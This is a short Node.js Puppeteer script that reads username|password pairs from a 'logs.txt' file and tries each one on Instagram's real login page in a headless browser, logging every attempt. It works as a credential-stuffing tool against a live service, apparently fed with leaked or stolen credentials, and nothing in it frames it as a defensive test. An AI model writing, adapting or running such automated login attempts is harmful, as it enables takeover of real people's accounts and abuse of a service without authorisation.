const puppeteer = require('puppeteer');

(async () => {
    const browser = await puppeteer.launch({ headless: true });
    const page = await browser.newPage();

    // Read credentials from logs.txt
    const fs = require('fs');
    const credentials = fs.readFileSync('logs.txt', 'utf-8').split('\n').filter(Boolean);

    for (const credential of credentials) {
        const [username, password] = credential.split('|').map(item => item.trim());

        try {
            await page.goto('https://www.instagram.com/accounts/login/');

            // Enter username and password
            await page.type('input[name="username"]', username);
            await page.type('input[name="password"]', password);
            await page.click('button[type="submit"]');

            // Wait for navigation
            await page.waitForNavigation();

            console.log(`Tried login with: ${username}`);
        } catch (error) {
            console.error('Login failed', error);
        }
    }

    await browser.close();
})();
